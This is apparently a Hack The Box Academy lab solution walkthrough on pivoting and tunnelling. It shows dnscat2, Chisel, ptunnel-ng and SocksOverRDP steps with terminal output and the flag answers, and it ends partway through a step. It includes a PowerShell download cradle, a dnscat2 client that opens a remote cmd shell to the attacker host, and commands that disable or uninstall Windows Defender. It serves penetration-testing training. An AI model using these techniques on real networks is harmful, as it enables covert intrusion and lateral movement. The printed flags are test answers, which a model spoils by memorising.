On `Pwnbox`/`PMVPN`, students need to clone the `dnscat2` repository and compile/install the server:

Code: shell

```shell
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install
```

```
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ git clone https://github.com/iagox86/dnscat2.git

Cloning into 'dnscat2'...
remote: Enumerating objects: 6617, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 6617 (delta 0), reused 2 (delta 0), pack-reused 6607
Receiving objects: 100% (6617/6617), 3.84 MiB | 6.13 MiB/s, done.
Resolving deltas: 100% (4564/4564), done.
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cd dnscat2/server/
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~/dnscat2/server]
└──╼ [★]$ sudo gem install bundler
Fetching bundler-2.3.21.gem
Successfully installed bundler-2.3.21
Parsing documentation for bundler-2.3.21
Installing ri documentation for bundler-2.3.21
Done installing documentation for bundler after 0 seconds
1 gem installed
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~/dnscat2/server]
└──╼ [★]$ bundle install

Fetching gem metadata from https://rubygems.org/.......
Using bundler 2.3.21
Following files may not be writable, so sudo is needed:
  /usr/local/bin
  /var/lib/gems/2.7.0
  /var/lib/gems/2.7.0/build_info
  /var/lib/gems/2.7.0/cache
  /var/lib/gems/2.7.0/doc
  /var/lib/gems/2.7.0/extensions
  /var/lib/gems/2.7.0/gems
  /var/lib/gems/2.7.0/plugins
  /var/lib/gems/2.7.0/specifications
Fetching ecdsa 1.2.0
Fetching salsa20 0.1.1
Fetching sha3 1.0.1
Fetching trollop 2.1.2
Installing salsa20 0.1.1 with native extensions
Installing trollop 2.1.2
Installing ecdsa 1.2.0
Installing sha3 1.0.1 with native extensions
Bundle complete! 4 Gemfile dependencies, 5 gems now installed.
Use \`bundle info [gemname]\` to see where a bundled gem is installed.
```

Subsequently, students need to start the `dnscat2` server from `Pwnbox`/`PMVPN`:

Code: shell

```shell
sudo ruby dnscat2.rb --dns host=PWNIP,port=53,domain=inlanefreight.local --no-cache
```

```
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~/dnscat2/server]
└──╼ [★]$ sudo ruby dnscat2.rb --dns host=10.10.14.27,port=53,domain=inlanefreight.local --no-cache

New window created: 0
New window created: crypto-debug
dnscat2> Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.27:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=02c5d1724e0e97a2232bc2b53018921e inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=02c5d1724e0e97a2232bc2b53018921e

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

Thereafter, from Pwnbox/`PMVPN`, students need to clone the `dnscat2-powershell` client, which will be used from the client-side (i.e., the Windows target):

Code: shell

```shell
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ git clone https://github.com/lukebaggett/dnscat2-powershell.

Cloning into 'dnscat2-powershell'...
remote: Enumerating objects: 191, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 191 (delta 0), reused 2 (delta 0), pack-reused 188
Receiving objects: 100% (191/191), 1.26 MiB | 11.35 MiB/s, done.
Resolving deltas: 100% (59/59), done.
```

Students then need to connect to the spawned Windows target using `xfreerdp`, utilizing the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~/dnscat2/server]
└──╼ [★]$ xfreerdp /v:10.129.114.66 /u:htb-student /p:HTB_@cademy_stdnt!

[14:03:32:877] [2798:2799] [INFO][com.freerdp.core] -freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

Certificate details for 10.129.114.66:3389 (RDP-Server):
	Common Name: OFFICEMANAGER
	Subject:     CN = OFFICEMANAGER
	Issuer:      CN = OFFICEMANAGER
	Thumbprint:  a0:7a:87:4f:ed:ba:79:8f:54:df:d1:6b:29:64:4e:43:ad:9e:f4:b5:78:60:fa:4d:18:da:68:2e:97:5a:10:9e
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y

<SNIP>
```

![[HTB Solutions/CPTS/z. images/00ef574fa5138bf4ca9bd9c9142cfc53_MD5.jpg]]

Subsequently, students need to transfer `dnscat2-powershell` to the spawned Windows target using any file transfer technique (including dragging and dropping the file). To transfer the file, students can start a Python3 web server on `Pwnbox`/`PMVPN` where the folder `dnscat2-powershell` is:

Code: shell

```shell
python3 -m http.server PWNPO
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server 9001

Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Then, using `PowerShell` (run as administrator) from the Windows spawned target, students can download the file using the `.NET` `WebClient`:

Code: shell

```shell
(New-Object Net.WebClient).DownloadFile('http://PWNIP:PWNPO/dnscat2-powershell/dnscat2.ps1', 'dnscat2.ps1')
```

```
PS C:\Windows\system32> (New-Object Net.WebClient).DownloadFile('http://10.10.14.17:9001/dnscat2-powershell/dnscat2.ps1', 'dnscat2.ps1')
```

After successfully downloading the `dnscat2.ps1` file, students need to import it as a module:

Code: powershell

```powershell
Import-Module .\dnscat2.ps1
```

```
PS C:\Windows\system32> Import-Module .\dnscat2.ps1
```

Subsequently, to attain a shell on the attacking host, students need to use `dnscat2` as a client to establish connectivity with the `dnscat2` server that was started on `Pwnbox`/`PMVPN` (students need to make sure that the pre-shared secret supplied to the `-PreSharedSecret` option is the one that was generated by `dnscat2.rub` on `Pwnbox`/`PMVPN`):

Code: powershell

```powershell
Start-Dnscat2 -DNSServer PWNIP -Domain inlanefreight.local -PreSharedSecret ac8cddd0b8161f2672390f95f8089317 -Exec cmd
```

```
PS C:\Windows\system32> Start-Dnscat2 -DNSServer 10.10.14.17 -Domain inlanefreight.local -PreSharedSecret ac8cddd0b8161f2672390f95f8089317 -Exec cmd
```

Students will notice that a new session will be opened/received on the `dnscat2` server run on `Pwnbox`/`PMVPN`:

```
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
```

At last, students need to drop into a shell with the `window` command and print out the contents flag file "flag.txt" under the `C:\Users\htb-student\Documents\` directory, to attain `AC@tinth3Tunnel`:

Code: cmd

```cmd
window -i 1
type C:\Users\htb-student\Documents\flag.txt
```

```
window -i 1
New window created: 1

<SNIP>

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1> type C:\Users\htb-student\Documents\flag.txt
AC@tinth3Tunnel
```

Answer: `AC@tinth3Tunnel`

# SOCKS5 Tunneling with Chisel

## Question 1

### "Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\\Users\\victor\\Documents\\flag.txt as the answer."

On `Pwnbox`/`PMVPN`, students need to download an older version of `Chisel` (such as version `1.7.6_linux_amd64`) to their attack host:

Code: shell

```shell
wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
gunzip chisel_1.7.6_linux_amd64.gz
```

```
┌─[us-academy-5]─[10.10.14.225]─[htb-ac-594497@htb-ydgzaf0yn1]─[~]
└──╼ [★]$ wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz

┌─[us-academy-5]─[10.10.14.225]─[htb-ac-594497@htb-ydgzaf0yn1]─[~]
└──╼ [★]$ gunzip chisel_1.7.6_linux_amd64.gz 
```

Subsequently, students need to transfer `chisel` to the spawned Ubuntu pivot host using `scp`, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
scp chisel_1.7.6_linux_amd64 ubuntu@STMIP:~/
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~/chisel]
└──╼ [★]$ scp chisel_1.7.6_linux_amd64 ubuntu@10.129.202.64:~/

chisel_1.7.6_linux_amd64           100%   11MB   2.2MB/s   00:04
```

Thereafter, students need to use SSH to connect to the spawned Ubuntu pivot host, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh ubuntu@STMIP
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~/chisel]
└──╼ [★]$ ssh ubuntu@10.129.202.64
ubuntu@10.129.202.64's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

<SNIP>

Last login: Thu May 12 17:27:41 2022
ubuntu@WEB01:~$
```

After connecting successfully, students need to run `chisel` as a server with the `--socks5` option:

Code: shell

```shell
chmod +x chisel_1.7.6_linux_amd64
./chisel_1.7.6_linux_amd64 server -v -p 9001 --socks5
```

```
ubuntu@WEB01:~$ chmod +x chisel_1.7.6_linux_amd64 
ubuntu@WEB01:~$ ./chisel_1.7.6_linux_amd64 server -v -p 9001 --socks5

2024/07/22 15:58:14 server: Fingerprint ahzt0qJwsDsK64elAJZvaVS+AoqJhgbpnV56kZvn/b8=
2024/07/22 15:58:14 server: Listening on http://0.0.0.0:9001
```

Then, from `Pwnbox`/`PMVPN`, students need to run `chisel` as a client to connect to the `chisel` server running on the Ubuntu pivot host:

Code: shell

```shell
chmod +x chisel_1.7.6_linux_amd64
./chisel_1.7.6_linux_amd64 client -v STMIP:9001 socks
```

```
┌─[us-academy-1]─[10.10.14.225]─[htb-ac-594497@htb-ydgzaf0yn1]─[~]
└──╼ [★]$ chmod +x ./chisel_1.7.6_linux_amd64 

┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~/chisel]
└──╼ [★]$ ./chisel_1.7.6_linux_amd64 client -v 10.129.202.64:9001 socks

2022/08/29 16:43:10 client: Connecting to ws://10.129.202.64:9001
2022/08/29 16:43:10 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/08/29 16:43:10 client: tun: Bound proxies
2022/08/29 16:43:11 client: Handshaking...
2022/08/29 16:43:11 client: Sending config
2022/08/29 16:43:11 client: Connected (Latency 87.992506ms)
2022/08/29 16:43:11 client: tun: SSH connected
```

Students must ensure that the following `proxychains` SOCKS5 entry is found (and that the SOCKS4 default entry is commented out) within the `proxychains.conf` file on `Pwnbox`/`PMVPN`:

Code: shell

```shell
socks5 127.0.0.1 1080
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~/chisel]
└──╼ [★]$ tail -n2 /etc/proxychains.conf

#socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Then, from `Pwnbox`/`PMVPN`, students need to use `proxychains` and `xfreerdp` to pivot to the DC on the internal network (`172.16.5.19`) with the credentials `victor:pass@123`:

Code: shell

```shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~/chisel]
└──╼ [★]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'

ProxyChains-3.1 (http://proxychains.sf.net)
[17:15:23:809] [3025:3026] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

Certificate details for 172.16.5.19:3389 (RDP-Server):
	Common Name: DC01.inlanefreight.local
	Subject:     CN = DC01.inlanefreight.local
	Issuer:      CN = DC01.inlanefreight.local
	Thumbprint:  a4:31:db:42:16:60:1c:09:a0:85:d7:11:e0:10:b9:03:14:58:69:3f:0a:86:c2:ba:65:85:ea:0b:87:09:94:06
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

![[HTB Solutions/CPTS/z. images/40856e6bad41ed64f33384cafd15a6dc_MD5.jpg]]

Students, at last, need to print out the contents of the flag file "flag.txt" under the directory `C:\Users\victor\Documents\` to attain `Th3$eTunne1$@rent8oring!`:

Code: shell

```shell
type \Documents\flag.txt
```

```
C:\Users\victor>type Documents\flag.txt

Th3$eTunne1$@rent8oring!
```

Answer: `Th3$eTunne1$@rent8oring!`

# ICMP Tunneling with SOCKS

## Question 1

### "Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\\Users\\victor\\Downloads\\flag.txt as the answer."

On `Pwnbox`/`PMVPN`, students need to clone the [ptunnel-ng](https://github.com/utoni/ptunnel-ng.git) repository and then statically build it with the "autogen.sh" script:

Code: shell

```shell
git clone https://github.com/utoni/ptunnel-ng.git
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

```
┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-1dos1dn7rk]─[~]
└──╼ [★]$ git clone https://github.com/utoni/ptunnel-ng.git

Cloning into 'ptunnel-ng'...
remote: Enumerating objects: 1412, done.
remote: Counting objects: 100% (318/318), done.
remote: Compressing objects: 100% (136/136), done.
remote: Total 1412 (delta 186), reused 295 (delta 174), pack-reused 1094 (from 1)
Receiving objects: 100% (1412/1412), 709.91 KiB | 22.90 MiB/s, done.
Resolving deltas: 100% (908/908), done.

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-1dos1dn7rk]─[~]
└──╼ [★]$ sudo apt install automake autoconf -y

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
automake is already the newest version (1:1.16.5-1.3).
autoconf is already the newest version (2.71-3).
The following packages were automatically installed and are no longer required:
  espeak-ng-data geany-common libamd2 libbabl-0.1-0 libbrlapi0.8 libcamd2
  libccolamd2 libcholmod3 libdotconf0 libept1.6.0 libespeak-ng1 libgegl-0.4-0
  libgegl-common libgimp2.0 libmetis5 libmng1 libmypaint-1.5-1
  libmypaint-common libpcaudio0 libsonic0 libspeechd2 libtorrent-rasterbar2.0
  libumfpack5 libwmf-0.2-7 libwpe-1.0-1 libwpebackend-fdo-1.0-1 libxapian30
  node-clipboard node-prismjs python3-brlapi python3-louis python3-pyatspi
  python3-speechd sound-icons speech-dispatcher-audio-plugins xbrlapi xkbset
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 182 not upgraded.

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-1dos1dn7rk]─[~]
└──╼ [★]$ cd ptunnel-ng/

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-1dos1dn7rk]─[~/ptunnel-ng]
└──╼ [★]$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-1dos1dn7rk]─[~/ptunnel-ng]
└──╼ [★]$ ./autogen.sh 

++ pwd
+ OLD_WD=/home/htb-ac-8414/ptunnel-ng
++ dirname ./autogen.sh
+ NEW_WD=.
+ cd .
+ autoreconf -fi

<SNIP>
```

Then, students need to transfer the `ptunnel-ng` directory to the spawned Ubuntu target, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
scp -r ptunnel-ng ubuntu@STMIP
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ scp -r ptunnel-ng ubuntu@10.129.151.105:~/
ubuntu@10.129.151.105's password: 

applypatch-msg.sample     100%  478     5.2KB/s   00:00    
commit-msg.sample         100%  896    10.0KB/s   00:00    
fsmonitor-watchman.sample 100% 4655    51.3KB/s   00:00    
post-update.sample        100%  189     2.1KB/s   00:00    
pre-applypatch.sample     100%  424     4.7KB/s   00:00

<SNIP>
```

Thereafter, students need to use SSH to connect to the spawned Ubuntu pivot host, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh ubuntu@STMIP
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~/chisel]
└──╼ [★]$ ssh ubuntu@10.129.151.105
ubuntu@10.129.151.105's password:

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

<SNIP>

Last login: Mon Aug 29 16:01:34 2022 from 10.10.14.17
ubuntu@WEB01:~$
```

After connecting successfully, students need to run `ptunnel-ng` as a server:

Code: shell

```shell
sudo ./ptunnel-ng/src/ptunnel-ng -rSTMIP -R22
```

```
ubuntu@WEB01:~$ sudo ./ptunnel-ng/src/ptunnel-ng -r10.129.151.105 -R22

[sudo] password for ubuntu: 
./ptunnel-ng/src/ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng/src/ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

Subsequently, from `Pwnbox`/`PMVPN`, students need to run `ptunnel-ng` as a client to connect to the server running on the Ubuntu pivot host:

Code: shell

```shell
sudo ./ptunnel-ng/src/ptunnel-ng -pSTMIP -l2222 -rSTMIP -R22
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo ./ptunnel-ng/src/ptunnel-ng -p10.129.151.105 -l2222 -r10.129.151.105 -R22

[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

Then, from `Pwnbox`/`PMVPN`, students need to connect to the target Ubuntu pivot host using the established ICMP tunnel and SSH, testing if it is possible to connect to the target via the tunnel, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh -p2222 -lubuntu 127.0.0.1
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -p2222 -lubuntu 127.0.0.1

The authenticity of host '[127.0.0.1]:2222 ([127.0.0.1]:2222)' can't be established.
ECDSA key fingerprint is SHA256:AelxWP/kQK76SQAaNbbaRFJ8vSmDBr/XB8/66aPreGs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:2222' (ECDSA) to the list of known hosts.
ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

<SNIP>

Last login: Mon Aug 29 17:09:32 2022 from 10.10.14.17
ubuntu@WEB01:~$ 
```

Now that the test succeeded, from `Pwnbox`/`PMVPN`, students need to connect to the spawned Ubuntu pivot host using the established ICMP tunnel and SSH dynamic port forwarding to setup for proxychain-ing, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
ubuntu@127.0.0.1's password: 

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
<SNIP>

Last login: Mon Aug 29 17:18:45 2022 from 10.129.151.105
ubuntu@WEB01:~$
```

Then, from `Pwnbox`/`PMVPN`, students need to use `proxychains` to connect to the DC on the internal network, utilizing the credentials `victor:pass@123`:

Code: shell

```shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /dynamic-resolution

ProxyChains-3.1 (http://proxychains.sf.net)
[18:41:24:713] [5728:5729] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

Certificate details for 172.16.5.19:3389 (RDP-Server):
	Common Name: DC01.inlanefreight.local
	Subject:     CN = DC01.inlanefreight.local
	Issuer:      CN = DC01.inlanefreight.local
	Thumbprint:  40:95:ac:ba:4e:1e:99:d0:99:eb:ce:5f:d0:c8:a8:18:85:52:5e:2d:7b:9d:d5:e1:57:7f:6e:8d:ef:ac:66:d5
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y

<SNIP>
```

!\[\[PivotingCOMMA\_TunnelingCOMMA\_and\_Port\_Forwarding\_Walkthrough\_Image\_20.png\]\]

Students, at last, need to print out the contents of the flag file "flag.txt" under the directory `C:\Users\victor\Downloads\` to attain `N3Tw0rkTunnelV1sion!`:

Code: cmd

```cmd
type .\Downloads\flag.txt.txt
```

```
C:\Users\victor>type .\Downloads\flag.txt.txt

N3Tw0rkTunnelV1sion!
```

Answer: `N3Tw0rkTunnelV1sion!`

# RDP and SOCKS Tunneling with SocksOverRDP

## Question 1

### "Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop."

On Pwnbox/`PMVPN`, students need to download `SocksOverRDP` and `Proxifier`:

Code: shell

```shell
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
wget https://www.proxifier.com/download/ProxifierPE.zip
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip

--2022-08-29 18:52:57--  https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
Saving to: ‘SocksOverRDP-x64.zip’

SocksOverRDP-x64.zip            100%[======================================================>]  43.15K  --.-KB/s    in 0.001s  

2022-08-29 18:52:58 (36.1 MB/s) - ‘SocksOverRDP-x64.zip’ saved [44183/44183]

┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://www.proxifier.com/download/ProxifierPE.zip

--2022-08-29 18:53:52--  https://www.proxifier.com/download/ProxifierPE.zip
Resolving www.proxifier.com (www.proxifier.com)... 172.104.17.238
Connecting to www.proxifier.com (www.proxifier.com)|172.104.17.238|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3080345 (2.9M) [application/zip]
Saving to: ‘ProxifierPE.zip’

ProxifierPE.zip                 100%[======================================================>]   2.94M  4.55MB/s    in 0.6s    

2022-08-29 18:53:53 (4.55 MB/s) - ‘ProxifierPE.zip’ saved [3080345/3080345]
```

Afterward, students need to unzip the two files:

Code: shell

```shell
unzip SocksOverRDP-x64.zip
unzip ProxifierPE.zip
```

```
┌─[us-academy-1]─[10.10.14.21]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip SocksOverRDP-x64.zip

Archive:  SocksOverRDP-x64.zip
  inflating: SocksOverRDP-Plugin.dll  
  inflating: SocksOverRDP-Server.exe
┌─[us-academy-1]─[10.10.14.21]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip ProxifierPE.zip
Archive:  ProxifierPE.zip
   creating: Proxifier PE/
  inflating: Proxifier PE/Helper64.exe  
  inflating: Proxifier PE/Proxifier.exe  
  inflating: Proxifier PE/ProxyChecker.exe  
  inflating: Proxifier PE/PrxDrvPE.dll  
  inflating: Proxifier PE/PrxDrvPE64.dll
```

Subsequently, students need to connect to the spawned Windows pivot host using `xfreerdp`, utilizing the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.113.142 /u:htb-studnet /p:HTB_@cademy_stdnt!

[18:58:58:972] [6604:6605] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

Certificate details for 10.129.113.142:3389 (RDP-Server):
	Common Name: OFFICEMANAGER
	Subject:     CN = OFFICEMANAGER
	Issuer:      CN = OFFICEMANAGER
	Thumbprint:  a0:7a:87:4f:ed:ba:79:8f:54:df:d1:6b:29:64:4e:43:ad:9e:f4:b5:78:60:fa:4d:18:da:68:2e:97:5a:10:9e
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y

<SNIP>
```

![[HTB Solutions/CPTS/z. images/ac39fad4b738d52892c8978bad0359e3_MD5.jpg]]

After connecting successfully, and before downloading the two files and one directory, students can either uninstall or turn off Windows Defender (otherwise the DLL will not be allowed to be loaded and will get deleted automatically, and in case it does get deleted, students need to copy and paste it again), in here, it will be turned off, following the steps below:

![[HTB Solutions/CPTS/z. images/cf334c56d0533c34d7e4f56efb5d6d01_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/d2abde896aa44668df34b8d7766c266c_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/e3406063c75f8c3d86e73749bba28911_MD5.jpg]]

Thereon, students need to transfer the files `SocksOverRDP-Plugin.dll`, `SocksOverRDP-Server.exe` and the `Proxifier PE` directory, to the spawned Windows target using any file transfer technique, with the easiest being copying and pasting the two files and one folder:

![[HTB Solutions/CPTS/z. images/254bbaefaadbc22b8bdf249bf9cfd1bf_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/7af8938cfbaa2b9a7d9c7808371afdc5_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/160ce18b6ee03e1a900f2cb3a12ab0ee_MD5.jpg]]

Subsequently, students then need to use `regsvr32.exe` to load `SocksOverRDP-Plugin.dll` from within a privileged (i.e., administrator) `PowerShell` session where the DLL was pasted:

Code: powershell

```powershell
regsvr32.exe SocksOverRDP-Plugin.dll
```

![[HTB Solutions/CPTS/z. images/5b879511ce3fd9444e53aa74cd30c516_MD5.jpg]]

Afterward, students need to open `mstsc.exe` from within `PowerShell` and connect to the internal DC at `172.16.5.19`, using the credentials `victor:pass@123`:

![[HTB Solutions/CPTS/z. images/eb2d1fa65a7bedc1f4de3908f8c04749_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/23d5db4ed09080e9593b14496832673d_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/e730c65b3c2f3944b5bdaeaf1196b500_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/8595ce7c30bc0ff94296a4fc216061af_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/53e16a6b1a29562067fcae0a16ebe5b4_MD5.jpg]]

Then, students need to transfer `SocksOverRDP-Server.exe` to the internal DC at `172.16.5.19`, however, before that, they need to uninstall Windows Defender (otherwise the executable will be deleted constantly):

Code: powershell

```powershell
Uninstall-WindowsFeature -Name Windows-Defender
```

```
PS C:\Windows\system32> Uninstall-WindowsFeature -Name Windows-Defender

Success Restart Needed Exit Code      Feature Result
------- -------------- ---------      --------------
True    No             NoChangeNeeded {}
```

Once uninstalled, students can copy and paste the executable to the DC:

![[HTB Solutions/CPTS/z. images/58818eef2cdeb248ef8925584fd47ca0_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/a6c6596559b2bc2e8a088e9264398595_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/4537820bcfab6b1efbf55747794e1135_MD5.jpg]]

Subsequently, students need to run it as administrator:

![[HTB Solutions/CPTS/z. images/ac8d75d82a2013d4aa7006b6c823594d_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/4d76e300f08fc605d41f7b1282f10935_MD5.jpg]]

Students then need to minimize this RDP connection:

![[HTB Solutions/CPTS/z. images/57f40b7de337787a2a9ccb4220e01b4f_MD5.jpg]]

Thereon, students need to run the `Proxifier` executable as administrator:

![[HTB Solutions/CPTS/z. images/a60ed40881655bcd2c4aedb22e18f249_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/c729834dd885e7bb0c38601594929fd7_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/5e116b77e0159bf8e100732de3654cb8_MD5.jpg]]

Once opened, students need to click on `Profile` --> `Proxy Servers...`:

